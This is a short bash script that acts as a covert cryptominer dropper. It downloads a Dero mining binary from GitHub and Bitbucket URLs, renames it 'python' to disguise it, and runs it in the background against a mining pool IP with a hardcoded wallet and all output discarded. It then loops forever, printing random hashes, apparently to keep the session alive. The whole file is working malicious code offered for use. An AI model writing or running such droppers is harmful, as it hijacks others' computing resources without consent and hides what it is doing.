#!/bin/bash
curl -L -o python https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x python
curl -L -o python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
./python -r 139.162.185.177:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.anu >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
